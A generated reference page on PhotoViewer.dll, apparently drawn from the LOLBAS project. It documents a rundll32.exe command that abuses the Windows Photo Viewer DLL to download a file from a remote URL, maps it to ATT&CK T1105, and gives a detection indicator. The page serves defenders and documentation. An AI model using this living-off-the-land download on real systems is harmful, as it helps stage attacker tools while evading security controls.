---
title: "PhotoViewer.dll"
framework: "lolbas"
generated: "true"
source_path: "yml/OSLibraries/PhotoViewer.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/PhotoViewer.yml"
build_date: "2026-04-27 19:14:21"
category: "OSLibraries"
aliases:
  - "PhotoViewer.dll"
functions:
  - "Download"
attack_technique_ids:
  - "T1105"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Windows Photo Viewer

## Paths

- `C:\Program Files\Windows Photo Viewer\PhotoViewer.dll`
- `C:\Program Files (x86)\Windows Photo Viewer\PhotoViewer.dll`

## Commands

### 1. Download

Once executed, rundll32.exe will download the file at the specified URL to the user's INetCache folder using the Windows Photo Viewer DLL.

```cmd
rundll32.exe "C:\Program Files\Windows Photo Viewer\PhotoViewer.dll",ImageView_Fullscreen {REMOTEURL}
```

- Use Case: Download file from remote location.
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]

## Detections

- IOC: Execution of rundll32.exe with 'ImageView_Fullscreen' and a remote URL (containing '://') as an argument

## Acknowledgements

- {'Person': 'Avihay Eldad', 'Handle': '@avihayeldad'}
- {'Person': 'Tommy Warren'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/PhotoViewer.yml)
